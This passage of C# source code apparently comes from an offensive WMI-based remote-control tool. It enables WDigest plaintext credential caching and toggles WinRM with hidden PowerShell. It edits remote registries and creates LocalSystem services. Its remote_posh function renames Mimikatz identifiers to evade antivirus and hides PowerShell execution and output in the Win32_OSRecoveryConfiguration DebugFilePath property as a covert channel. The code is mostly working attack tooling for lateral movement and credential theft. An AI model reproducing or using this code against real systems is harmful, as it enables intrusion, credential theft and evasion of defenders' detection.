                    ManagementBaseObject outParamsSet = mc.InvokeMethod("SetDWORDValue", inParamsSet, null);
                    Console.WriteLine(outParamsSet != null && Convert.ToUInt32(outParamsSet["ReturnValue"]) == 0
                        ? "Successfully enabled wdigest"
                        : "Error enabling wdigest");
                }
            }
            else
            {
                // GetDWORDValue call failed or UseLogonCredential not created, let's create it
                ManagementBaseObject inParamsSet = mc.GetMethodParameters("SetDWORDValue");
                inParamsSet["hDefKey"] = 0x80000002; // HKEY_LOCAL_MACHINE
                inParamsSet["sSubKeyName"] = "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest";
                inParamsSet["sValueName"] = "UseLogonCredential";
                inParamsSet["uValue"] = 0x00000001;

                ManagementBaseObject outParamsSet = mc.InvokeMethod("SetDWORDValue", inParamsSet, null);
                Console.WriteLine(outParamsSet != null && Convert.ToUInt32(outParamsSet["ReturnValue"]) == 0
                    ? "Successfully created and enabled wdigest"
                    : "Error creating and enabling wdigest");
            }

            return true;
        }

        public object disable_winrm(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            ObjectGetOptions options = new ObjectGetOptions();
            ManagementPath pather = new ManagementPath("Win32_Process");
            ManagementClass classInstance = new ManagementClass(scope, pather, options);
            ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
            inParams["CommandLine"] = "powershell -w hidden -command \"Disable-PSRemoting -Force\"";

            ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
            
            Console.WriteLine(outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0
                ? "Successfully disabled WinRM"
                : "Issues disabling WinRM");

            return true;
        }

        public object enable_winrm(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            ObjectGetOptions options = new ObjectGetOptions();
            ManagementPath pather = new ManagementPath("Win32_Process");
            ManagementClass classInstance = new ManagementClass(scope, pather, options);
            ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");
            inParams["CommandLine"] = "powershell -w hidden -command \"Enable-PSRemoting -Force\"";

            ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);
            
            Console.WriteLine(outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0
                ? "Successfully enabled WinRM"
                : "Issues enabling WinRM");

            return true;
        }

        public object registry_mod(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            Dictionary<string, uint> regRootValues = new Dictionary<string, uint>
            {
                {"HKCR", 0x80000000},
                {"HKEY_CLASSES_ROOT", 0x80000000},
                {"HKCU", 0x80000001},
                {"HKEY_CURRENT_USER", 0x80000001},
                {"HKLM", 0x80000002},
                {"HKEY_LOCAL_MACHINE", 0x80000002},
                {"HKU", 0x80000003},
                {"HKEY_USERS", 0x80000003},
                {"HKCC", 0x80000005},
                {"HKEY_CURRENT_CONFIG", 0x80000005}
            };

            // Shouldn't really need more types for now. This can be added to later on
            string[] regValType = {"REG_SZ", "REG_EXPAND_SZ", "REG_BINARY", "REG_DWORD", "REG_MULTI_SZ"};
            string fullRegKey = planter.Commander.RegKey;

            // Grab the root key
            string[] fullRegKeyArray = fullRegKey.Split(new[] {'\\'}, 2);
            string defKey = fullRegKeyArray[0].ToUpper();
            string regKey = fullRegKeyArray[1];

            ManagementClass mc = new ManagementClass("stdRegProv")
            {
                Scope = scope
            };

            //Make sure the root key is valid
            if (!regRootValues.ContainsKey(defKey))
            {
                Messenger.ErrorMessage(
                    "[-] Root registry key needs to be in the correct form and valid (ex: HKCU or HKEY_CURRENT_USER)");
                return null;
            }
            
            string pulledRegValType;
            switch (planter.Commander.Command)
            {
                case "reg_create" when !regValType.Any(planter.Commander.RegValType.ToUpper().Contains):
                    Messenger.ErrorMessage(
                        "[-] Registry value type needs to be in the correct form and valid (REG_SZ, REG_BINARY, or REG_DWORD)");
                    return null;
                case "reg_create":
                {
                    GetMethods method = new GetMethods(planter.Commander.RegValType.ToUpper());
                    SetRegistry(method.RegSetMethod, regRootValues[defKey], regKey, planter.Commander.RegSubKey, planter.Commander.RegVal, mc);
                    break;
                }
                case "reg_delete":
                {
                    // Grab the correct type for the registry data entry
                    pulledRegValType = CheckRegistryType(regRootValues[defKey], regKey, planter.Commander.RegSubKey, mc);
                    GetMethods method = new GetMethods(pulledRegValType);

                    if (CheckRegistry(method.RegGetMethod, regRootValues[defKey], regKey, planter.Commander.RegSubKey, mc))
                        DeleteRegistry(regRootValues[defKey], regKey, planter.Commander.RegSubKey, mc);
                    else
                    {
                        Console.WriteLine("Issue deleting registry value");
                        return null;
                    }

                    break;
                }
                case "reg_mod":
                {
                    pulledRegValType = CheckRegistryType(regRootValues[defKey], regKey, planter.Commander.RegSubKey, mc);
                    GetMethods method = new GetMethods(pulledRegValType);

                    if (CheckRegistry(method.RegGetMethod, regRootValues[defKey], regKey, planter.Commander.RegSubKey, mc))
                    {
                        SetRegistry(method.RegSetMethod, regRootValues[defKey], regKey, planter.Commander.RegSubKey, planter.Commander.RegVal, mc);
                    }
                    else
                    {
                        Console.WriteLine("Issue modifying registry value");
                        return null;
                    }

                    break;
                }
            }

            return true;
        }

        public object remote_posh(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            string originalWmiProperty = GetOsRecovery(scope);
            bool wsman = true;
            string[] powerShellExtensions = {"ps1", "psm1", "psd1"};
            string modifiedWmiProperty = null;


            if (!File.Exists(planter.Commander.File))
            {
                Messenger.ErrorMessage(
                    "[-] Specified local PowerShell script does not exist, not running PS runspace\n");
                return null;
            }

            //Make sure it's a PS script
            if (!powerShellExtensions.Any(Path.GetExtension(planter.Commander.File).Contains))
            {
                Messenger.ErrorMessage(
                    "[-] Specified local PowerShell script does not have the correct extension not running PS runspace\n");
                return null;
            }

            Messenger.GoodMessage("[+] Executing cmdlet: " + planter.Commander.Cmdlet);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            if (wsman == true)
            {
                // We can modify this later easily to pass wsman if needed
                using (PowerShell powershell = PowerShell.Create())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                            powershell.Runspace = RunspaceCreate(planter);
                        else
                            powershell.Runspace = RunspaceCreateLocal();
                    }
                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                    {
                        wsman = false;
                    }

                    string script = File.ReadAllText(planter.Commander.File ?? throw new InvalidOperationException());

                    // Let's remove all comment blocks to save space/keep it from getting flagged
                    script = Regex.Replace(script, @"(?s)<#(.*?)#>", string.Empty);
                    // Let's also remove whitespace
                    script = Regex.Replace(script, @"^\s*$[\r\n]*", string.Empty, RegexOptions.Multiline);
                    // And all comments
                    script = Regex.Replace(script, @"#.*", "");

                    // Let's also modify all functions to random (but keep the name of the one we want)
                    // This is pretty hacky but i think will work for now
                    //string functionToRun = RandomString(10);
                    //script = script.Replace("Function " + planter.Commander.Cmdlet, functionToRun);
                    //script = Regex.Replace(script, @"Function .*", "Function " + RandomString(10), RegexOptions.IgnoreCase);
                    //script = script.Replace(functionToRun, "Function " + functionToRun);


                    // Try to remove mimikatz and replace it with something else along with some other 
                    // replacements from here https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
                    // Works currently but the unedited PS script fails for some reason
                    script = Regex.Replace(script, @"\bmimikatz\b", RandomString(5), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bdumpcreds\b", RandomString(6), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bargumentptr\b", RandomString(4), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc1\b", RandomString(10), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc2\b", RandomString(10), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc3\b", RandomString(10), RegexOptions.IgnoreCase);

                    if (powershell.Runspace.ConnectionInfo != null)
                    {
                        // This all works right now but if we see issues down the line with output we may need to throw the output in DebugFilePath property
                        // Will want to add in some obfuscation
                        powershell.AddScript(script).AddScript("Invoke-Expression ; " + planter.Commander.Cmdlet);

                        Collection<PSObject> results;
                        try
                        {
                            results = powershell.Invoke();
                        }
                        catch (Exception e)
                        {
                            Messenger.ErrorMessage("[-] Error: Issues with PowerShell script, it may have been flagged by AV");
                            Console.WriteLine(e);
                            throw new CaughtByAvException("PS");
                        }


                        foreach (PSObject result in results)
                        {
                            Console.WriteLine(result);
                        }

                        //return true;
                    }
                    else
                        wsman = false;
                }
            }

            if (wsman == false)
            {
                List<int> intList = new List<int>();
                byte[] scriptBytes = File.ReadAllBytes(planter.Commander.File);

                //Convert from byte to int (bytes)
                foreach (byte uploadByte in scriptBytes)
                {
                    int a = uploadByte;
                    intList.Add(a);
                }

                SetOsRecovery(scope, string.Join(",", intList));

                // Give it a second to write and check for changes to DebugFilePath
                Thread.Sleep(1000);
                CheckForFinishedDebugFilePath(originalWmiProperty, scope);

                // Get the debugfilepath again so we can check it later on for longer running tasks
                modifiedWmiProperty = GetOsRecovery(scope);

                // WSMAN not enabled on the remote system, use another method
                ObjectGetOptions options = new ObjectGetOptions();
                ManagementPath pather = new ManagementPath("Win32_Process");
                ManagementClass classInstance = new ManagementClass(scope, pather, options);
                ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");

                string encodedCommand =
                    "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [char[]][int[]]$encdata.Split(',') -Join ' '; $a | .(-Join[char[]]@(105,101,120));";
                encodedCommand += "$output = (" + planter.Commander.Cmdlet + " | Out-String).Trim();";
                encodedCommand += " $EncodedText = [Int[]][Char[]]$output -Join ',';";
                encodedCommand +=
                    " $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()";

                var encodedCommandB64 =
                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;

                ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);

                if (outParams != null)
                    switch (Convert.ToUInt32(outParams["ReturnValue"]))
                    {
                        case 0:
                            break;
                        default:
                            throw new CaughtByAvException("PS");
                    }

                // Give it a second to write
                Thread.Sleep(1000);
            }

            // Give it a second to write and check for changes to DebugFilePath. Should never be null but we should make sure
            Thread.Sleep(1000);
            if (modifiedWmiProperty != null)
                CheckForFinishedDebugFilePath(modifiedWmiProperty, scope);


            //Get the contents of the file in the DebugFilePath prop
            string[] commandOutput = GetOsRecovery(scope).Split(',');
            StringBuilder output = new StringBuilder();

            //Print output.
            foreach (string integer in commandOutput)
            {
                try
                {
                    char a = (char)Convert.ToInt32(integer);
                    output.Append(a);
                }
                catch
                {
                    //pass
                }
            }

            Console.WriteLine(output);
            SetOsRecovery(scope, originalWmiProperty);
            return true;
        }

        public object service_mod(Planter planter)
        {
            // For now, let's just view, start, stop, create, and delete a service, eh?
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string serviceName = planter.Commander.Service;
            string servicePath = planter.Commander.ServiceBin;
            string subCommand = planter.Commander.Execute;
            
            bool legitService = false;

            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Service");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();
            ManagementPath pather = new ManagementPath($"Win32_Service.Name='{serviceName}'");
            ManagementObject classInstance = new ManagementObject(scope, pather, null);


            if (subCommand == "list")
            {
                Console.WriteLine("{0,-45}{1,-40}{2,15}{3,15}", "Name", "Display Name", "State", "Accept Stopping?");
                Console.WriteLine("{0,-45}{1,-40}{2,15}{3,15}", "-----------", "-----------", "-------", "-------");

                foreach (var o in queryCollection)
                {
                    var wmiObject = (ManagementObject) o;
                    if (wmiObject["DisplayName"] != null && wmiObject["Name"] != null)
                    {
                        string name = (string)wmiObject["Name"];
                        if (name.Length > 40)
                            name = Truncate(name, 40) + "...";
                        string displayName = (string)wmiObject["DisplayName"];
                        if (displayName.Length > 35)
                            displayName = Truncate(displayName, 35) + "...";

                        try
                        {
                            Console.WriteLine("{0,-45}{1,-40}{2,15}{3,15}", name, displayName, wmiObject["State"], wmiObject["AcceptStop"]);
                        }
                        catch
                        {
                            //value probably doesn't exist, so just pass
                        }
                    }
                }
            }

            switch (subCommand)
            {
                case "start":
                {
                    // Let's make sure the service name is valid
                    foreach (var o in queryCollection)
                    {
                        var wmiObject = (ManagementObject) o;
                        if (wmiObject["Name"].ToString() == serviceName)
                        {
                            if (wmiObject["State"].ToString() != "Running")
                                legitService = true;
                            else
                            {
                                Messenger.WarningMessage("The process is already running, please stop it first");
                                return null;
                            }
                        }
                    }

                    if (legitService)
                    {
                        // Execute the method and obtain the return values.
                        ManagementBaseObject outParams = classInstance.InvokeMethod("StartService", null, null);

                        // List outParams
                        if (outParams != null)
                            switch (Convert.ToUInt32(outParams["ReturnValue"]))
                            {
                                case 0:
                                    Console.WriteLine("Successfully started service: " + serviceName);
                                    return queryCollection;
                                case 1:
                                    Console.WriteLine("The request is not supported for service: " + serviceName);
                                    return null;
                                case 2:
                                    Console.WriteLine("The user does not have the necessary access for service: " +
                                                      serviceName);
                                    return null;
                                case 7:
                                    Console.WriteLine(
                                        "The service did not respond to the start request in a timely fasion, is the binary an actual service binary?");
                                    return null;
                                default:
                                    Console.WriteLine("The service: " + serviceName +
                                                      " was not started. Return code: " +
                                                      Convert.ToUInt32(outParams["ReturnValue"]));
                                    return null;
                            }
                    }

                    else
                        throw new ServiceUnknownException(serviceName);

                    break;
                }
                case "stop":
                {
                    // Let's make sure the service name is valid
                    foreach (var o in queryCollection)
                    {
                        var wmiObject = (ManagementObject) o;
                        if (wmiObject["Name"].ToString() == serviceName)
                        {
                            if (wmiObject["State"].ToString() == "Running" && wmiObject["AcceptStop"].ToString() == "True")
                                legitService = true;
                            else
                            {
                                Messenger.WarningMessage("The process is not running or does not accept stopping, please start it first or try another service");
                                return null;
                            }
                        }
                    }

                    if (legitService)
                    {
                        // Execute the method and obtain the return values.
                        ManagementBaseObject outParams = classInstance.InvokeMethod("StopService", null, null);


                        // List outParams
                        if (outParams != null)
                            switch (Convert.ToUInt32(outParams["ReturnValue"]))
                            {
                                case 0:
                                    Console.WriteLine("Successfully stopped service: " + serviceName);
                                    return queryCollection;
                                case 1:
                                    Console.WriteLine("The request is not supported for service: " + serviceName);
                                    return null;
                                case 2:
                                    Console.WriteLine("The user does not have the necessary access for service: " +
                                                      serviceName);
                                    return null;
                                default:
                                    Console.WriteLine("The service: " + serviceName +
                                                      " was not stopped. Return code: " +
                                                      Convert.ToUInt32(outParams["ReturnValue"]));
                                    return null;
                            }
                    }

                    else
                        throw new ServiceUnknownException(serviceName);

                    break;
                }
                case "delete":
                {
                    // Let's make sure the service name is valid
                    foreach (var o in queryCollection)
                    {
                        var wmiObject = (ManagementObject) o;
                        if (wmiObject["Name"].ToString() == serviceName)
                        {
                            if (wmiObject["State"].ToString() == "Running" && wmiObject["AcceptStop"].ToString() == "True")
                            {
                                // Let's stop the service
                                legitService = true;
                                ManagementBaseObject outParams = classInstance.InvokeMethod("StopService", null, null);
                                if (outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) != 0)
                                    Messenger.WarningMessage("[-] Warning: Unable to stop the service before deletion. Still marking the service to be deleted after stopping");
                            }
                            else if (wmiObject["State"].ToString() == "Stopped")
                            {
                                legitService = true;
                            }

                            else
                            {
                                Messenger.WarningMessage("The process is not running or does not accept stopping, please start it first or try another service");
                                return null;
                            }
                        }
                    }

                    if (legitService)
                    {
                        // Execute the method and obtain the return values.
                        ManagementBaseObject outParams = classInstance.InvokeMethod("Delete", null, null);

                        // List outParams
                        if (outParams != null)
                            switch (Convert.ToUInt32(outParams["ReturnValue"]))
                            {
                                case 0:
                                    Console.WriteLine("Successfully deleted service: " + serviceName);
                                    return queryCollection;
                                case 1:
                                    Console.WriteLine("The request is not supported for service: " + serviceName);
                                    return null;
                                case 2:
                                    Console.WriteLine("The user does not have the necessary access for service: " +
                                                      serviceName);
                                    return null;
                                default:
                                    Console.WriteLine("The service: " + serviceName +
                                                      " was not stopped. Return code: " +
                                                      Convert.ToUInt32(outParams["ReturnValue"]));
                                    return null;
                            }
                    }

                    else
                        throw new ServiceUnknownException(serviceName);

                    break;
                }
                case "create":
                {
                    ObjectGetOptions options = new ObjectGetOptions();
                    ManagementPath patherCreate = new ManagementPath("Win32_Service");
                    ManagementClass classInstanceCreate = new ManagementClass(scope, patherCreate, options);

                    // Let's make sure the service name is not already used
                    foreach (var o in queryCollection)
                    {
                        var wmiObject = (ManagementObject) o;
                        if (wmiObject["Name"].ToString() == serviceName)
                        {
                            Messenger.ErrorMessage("The process name provided already exists, please specify another one");
                            return null;
                        }
                    }

                    if (!legitService)
                    {
                        // Obtain in-parameters for the method
                        ManagementBaseObject inParams = classInstanceCreate.GetMethodParameters("Create");

                        // Add the input parameters.
                        inParams["Name"] = serviceName;
                        inParams["DisplayName"] = serviceName;
                        inParams["PathName"] = servicePath;
                        inParams["ServiceType"] = 16;
                        inParams["ErrorControl"] = 2;
                        inParams["StartMode"] = "Automatic";
                        inParams["DesktopInteract"] = true;
                        inParams["StartName"] = ".\\LocalSystem";
                        inParams["StartPassword"] = "";


                        // Execute the method and obtain the return values.
                        ManagementBaseObject outParams = classInstanceCreate.InvokeMethod("Create", inParams, null);

                        // List outParams
                        if (outParams != null)
                            switch (Convert.ToUInt32(outParams["ReturnValue"]))
                            {
                                case 0:
                                    Console.WriteLine("Successfully created service: " + serviceName);
                                    return queryCollection;
                                case 1:
                                    Console.WriteLine("The request is not supported for service: " + serviceName);
                                    return null;
                                case 2:
                                    Console.WriteLine("The user does not have the necessary access for service: " +
                                                      serviceName);
                                    return null;
                                default:
                                    Console.WriteLine("The service: " + serviceName + " was not stopped. Return code: " +
                                                      (int)outParams["ReturnValue"]);
                                    return null;
                            }
                    }

                    else
                        throw new ServiceUnknownException(serviceName);

                    break;
                }
            }

            return queryCollection;
        }


        public object ps(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            ObjectQuery fileQuery = new ObjectQuery("SELECT * FROM Win32_Process");
            ManagementObjectSearcher fileSearcher = new ManagementObjectSearcher(scope, fileQuery);
            ManagementObjectCollection queryCollection = fileSearcher.Get();

            Console.WriteLine("{0,-35}{1,15}", "Name", "Handle");
            Console.WriteLine("{0,-35}{1,15}", "-----------", "---------");

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                string name = (string)wmiObject["Name"];
                if (name.Length > 30)
                    name = Truncate(name, 30) + "...";
                try
                {
                    Console.WriteLine("{0,-35}{1,15}", name, wmiObject["Handle"]);
                }
                catch
                {
                    //value probably doesn't exist, so just pass
                }
            }
            return queryCollection;
        }

        public object process_kill(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string processToKill = planter.Commander.Process;

            Dictionary<string, string> procDict = new Dictionary<string, string>();

            // Grab all procs so we can build the dictionary
            ObjectQuery procQuery = new ObjectQuery("SELECT * FROM Win32_Process");
            ManagementObjectSearcher procSearcher = new ManagementObjectSearcher(scope, procQuery);
            ManagementObjectCollection queryCollection = procSearcher.Get();

            // Probs not efficient but let's create a dict of all the handles/process names
            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                procDict.Add((string)wmiObject["Handle"], (string)wmiObject["Name"]);
            }

            // If a process handle was given just kill it
            if (uint.TryParse(processToKill, out uint result))
            {
                KillProc(processToKill, procDict[processToKill], scope);
            }

            // If we got a process name
            else
            {
                //Parse for * sent in process name
                ObjectQuery pQuery;
                if (processToKill.Contains("*"))
                {
                    processToKill = processToKill.Replace("*", "%");
                    pQuery = new ObjectQuery($"SELECT * FROM Win32_Process WHERE Name like '{processToKill}'");
                }
                else
                {
                    pQuery = new ObjectQuery($"SELECT * FROM Win32_Process WHERE Name='{processToKill}'");
                }

                ManagementObjectSearcher pSearcher = new ManagementObjectSearcher(scope, pQuery);
                ManagementObjectCollection qCollection = pSearcher.Get();

                foreach (var o in qCollection)
                {
                    var wmiObject = (ManagementObject) o;
                    KillProc(wmiObject["Handle"].ToString(), procDict[wmiObject["Handle"].ToString()], scope);
                }
            }
            return true;
        }

        public object process_start(Planter planter)
        {
            ManagementScope scope = planter.Connector.ConnectedWmiSession;
            string binPath = planter.Commander.Process;
            
            if (!CheckForFile(binPath, scope, verbose:false))
            {
                Messenger.ErrorMessage(
                    "[-] Specified file does not exist on the remote system, not creating process\n");
                return null;
            }

            ManagementPath pather = new ManagementPath("Win32_Process");
            ManagementClass classInstance = new ManagementClass(scope, pather, null);

            // Obtain in-parameters for the method
            ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");

            // Add the input parameters.
            inParams["CommandLine"] = binPath;

            // Execute the method and obtain the return values.
            ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);

            if (outParams != null)
                switch (int.Parse(outParams["ReturnValue"].ToString()))
                {
                    case 0:
                        Console.WriteLine("Process {0} has been successfully created",
                            outParams["ProcessID"].ToString());
                        return true;
                    case 2:
                        throw new SecurityException("Access denied");
                    case 3:
                        throw new SecurityException("Insufficient privilege");
                    case 21:
                        throw new Exception("Invalid parameter");
                    default:
                        throw new Exception("Unknown failure");
                }

            return true;
        }

        public object logon_events(Planter planter)
        {
            // Hacky solution but works for now

            ManagementScope scope = planter.Connector.ConnectedWmiSession;

            string[] logonType = {"Logon Type:		2", "Logon Type:		10"};
            const string logonProcess = "Logon Process:		User32";
            Regex searchTerm = new Regex(@"(Account Name.+|Workstation Name.+|Source Network Address.+)");
            Regex r = new Regex("New Logon(.*?)Authentication Package", RegexOptions.Singleline);
            List<string[]> outputList = new List<string[]>();
            DateTime latestDate = DateTime.MinValue;

            ObjectQuery query =
                new ObjectQuery("SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            Messenger.WarningMessage("Depending on the amount of events, this may take some time to parse through.\n");

            Console.WriteLine("{0,-30}{1,-30}{2,-40}{3,-20}", "User Account", "System Connecting To",
                "System Connecting From", "Last Login");
            Console.WriteLine("{0,-30}{1,-30}{2,-40}{3,-20}", "------------", "--------------------",
                "----------------------", "----------");

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                string message = wmiObject["Message"].ToString(); // Let's avoid doing this multiple times

                if (logonType.Any(message.Contains) && message.Contains(logonProcess))
                {
                    Match singleMatch = r.Match(wmiObject["Message"].ToString());
                    string[] breaks = singleMatch.Value.Split(new[] {Environment.NewLine}, StringSplitOptions.None);
                    var queryMatchingFiles =
                        from line in breaks
                        let matches = searchTerm.Matches(line)
                        where matches.Count > 0
                        where !line.EndsWith("$")
                        select line;

                    List<string> tempList = new List<string>();
                    foreach (string v in queryMatchingFiles)
                    {
                        string[] importantInfo = v.Split(new[] {":"}, StringSplitOptions.RemoveEmptyEntries);
                        if (importantInfo[1].Trim() != "-")
                        {
                            if (!string.IsNullOrEmpty(importantInfo[1].Trim()))
                                tempList.Add(importantInfo[1].Trim());
                        }
                    }

                    DateTime tempDate = ManagementDateTimeConverter.ToDateTime(wmiObject["TimeGenerated"].ToString());
                    tempList.Add(tempDate.ToString(CultureInfo.InvariantCulture));

                    string[] tempArray = tempList.ToArray();

                    // We need to check if this is the first loop and handle accordingly
                    if (outputList.Count > 0)
                    {
                        // If any of the arrays in the outputList do not match the temp array (excluding datetime value)
                        if (!outputList.Any(p => p.Take(3).SequenceEqual(tempArray.Take(3))))
                        {
                            outputList.Add(tempArray);
                            latestDate = tempDate;
                        }
                    }

                    else
                        outputList.Add(tempArray);
                }
            }

            foreach (string[] entry in outputList)
            {
                Console.WriteLine("{0,-30}{1,-30}{2,-40}{3,-20}", entry[0], entry[1], entry[2], entry[3]);
            }

            return queryCollection;
        }

        public object KillProc(string handle, string procName, ManagementScope scope)
        {
            try
            {
                ManagementPath pather = new ManagementPath($"Win32_Process.Handle='{handle}'");
                ManagementObject classInstance = new ManagementObject(scope, pather, null);

                // Obtain in-parameters for the method
                ManagementBaseObject inParams = classInstance.GetMethodParameters("Terminate");

                // Execute the method and obtain the return values.
                ManagementBaseObject outParams = classInstance.InvokeMethod("Terminate", inParams, null);

                if (outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0)
                {
                    Console.WriteLine("Successfully killed '{0}'", procName);
                    return true;
                }

                Messenger.ErrorMessage("[-] Error: Not able to kill process: " + procName);
                return false;
            }
            catch (Exception e)
            {
                Messenger.ErrorMessage("[-] Error killing process: " + procName);
                Console.WriteLine(e);
                return false;
            }
        }

        public Runspace RunspaceCreate(Planter planter)
        {
            try
            {
                if (planter.Password == null)
                {
                    Uri remoteComputerUri = new Uri($"http://{planter.System}:5985/WSMAN");
                    WSManConnectionInfo connectionInfo = new WSManConnectionInfo(remoteComputerUri);
                    Runspace remoteRunspace = RunspaceFactory.CreateRunspace(connectionInfo);
                    remoteRunspace.Open();
                    return remoteRunspace;
                }

                string domainCredz = planter.Domain + "\\" + planter.User;
                Uri remoteComputer = new Uri($"http://{planter.System}:5985/wsman");
                PSCredential creds = new PSCredential(domainCredz, planter.Password);
                WSManConnectionInfo connection = new WSManConnectionInfo(remoteComputer, null, creds);

                Runspace runspace = RunspaceFactory.CreateRunspace(connection);
                runspace.Open();
                return runspace;

            }

            catch (System.Management.Automation.Remoting.PSRemotingTransportException)
            {
                Messenger.WarningMessage("[*] Issue creating PS runspace, the machine might not be accepting WSMan connections for a number of reasons," +
                    " trying process create method...\n");
                throw new System.Management.Automation.Remoting.PSRemotingTransportException();
            }

            catch (Exception e)
            {
                Messenger.ErrorMessage("[-] Error creating PS runspace");
                Console.WriteLine(e);
                return null;
            }
        }

        public Runspace RunspaceCreateLocal()
        {
            try
            {
                Runspace localRunspace = RunspaceFactory.CreateRunspace();
                localRunspace.Open();
                return localRunspace;
            }
            catch (System.Management.Automation.Remoting.PSRemotingTransportException)
            {
                Messenger.WarningMessage("[*] Issue creating PS runspace, the machine might not be accepting WSMan connections for a number of reasons, trying process create method...\n");
                throw new System.Management.Automation.Remoting.PSRemotingTransportException();
            }
            catch (Exception e)
            {
                Messenger.ErrorMessage("[-] Error creating PS runspace");
                Console.WriteLine(e);
                return null;
            }
        }

        public string GetOsRecovery(ManagementScope scope)
        {
            // Grab the original WMI Property so we can set it back afterwards
            string originalWmiProperty = null;

            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_OSRecoveryConfiguration");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                originalWmiProperty = wmiObject["DebugFilePath"].ToString();
            }

            return originalWmiProperty;
        }

        public static void SetOsRecovery(ManagementScope scope, string originalWmiProperty)
        {
            // Set the original WMI Property
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_OSRecoveryConfiguration");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject) o;
                if (wmiObject["DebugFilePath"] != null)
                {
                    wmiObject["DebugFilePath"] = originalWmiProperty;
                    wmiObject.Put();
                }
            }
        }

        public bool CheckForFile(string path, ManagementScope scoper, bool verbose)
        {
            string newPath = path.Replace("\\", "\\\\");

            ObjectQuery query = new ObjectQuery($"SELECT * FROM CIM_DataFile Where Name='{newPath}' ");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scoper, query);
            ManagementObjectCollection queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                if (Convert.ToInt32(wmiObject["FileSize"]) == 0)
                {
                    Messenger.ErrorMessage("[-] Error: The file is present but zero bytes, no contents to display");
                    return false;
                }
            }

            if (queryCollection.Count == 0)
            {
                if (verbose)
                    Messenger.ErrorMessage("[-] Specified file does not exist, not running PS runspace");
                return false;
            }

            return true;
        }

        public bool CheckRegistry(string regMethod, uint defKey, string regSubKey, string regSubKeyValue, ManagementClass mc)
        {
            // Block to be used to check the registry for specific values (before modifying or deleting)
            ManagementBaseObject inParamsSet = mc.GetMethodParameters(regMethod);
            inParamsSet["hDefKey"] = defKey;
            inParamsSet["sSubKeyName"] = regSubKey;
            inParamsSet["sValueName"] = regSubKeyValue;

            ManagementBaseObject outParamsSet = mc.InvokeMethod(regMethod, inParamsSet, null);

            if (outParamsSet != null && Convert.ToUInt32(outParamsSet["ReturnValue"]) == 0)
                return true;
            
            Messenger.ErrorMessage("[-] Registry key not valid, not modifying or deleting");
            Console.WriteLine("\nFull key provided: " + regSubKey + "\n" + "Value provided: " + regSubKeyValue);
            return false;
        }

        public string CheckRegistryType(uint defKey, string regSubKey, string regSubKeyValue, ManagementClass mc)
        {
            // Block to be used to check the registry for specific values (before modifying or deleting)
            const int regSz = 1;
            const int regExpandSz = 2;
            const int regBinary = 3;
            const int regDword = 4;
            const int regMultiSz = 7;

            // Obtain in-parameters for the method
            ManagementBaseObject inParams = mc.GetMethodParameters("EnumValues");

            // Add the input parameters.
            inParams["hDefKey"] = defKey;
            inParams["sSubKeyName"] = regSubKey;

            // Execute the method and obtain the return values.
            ManagementBaseObject outParams = mc.InvokeMethod("EnumValues", inParams, null);

            //Hacky way to get the type from the returned arrays
            int type = ((int[])outParams["Types"])[Array.IndexOf((string[])outParams.Properties["sNames"].Value, regSubKeyValue)];

            switch (type)
            {
                case regSz:
                    return "REG_SZ";
                case regExpandSz:
                    return "REG_EXPAND_SZ";
                case regBinary:
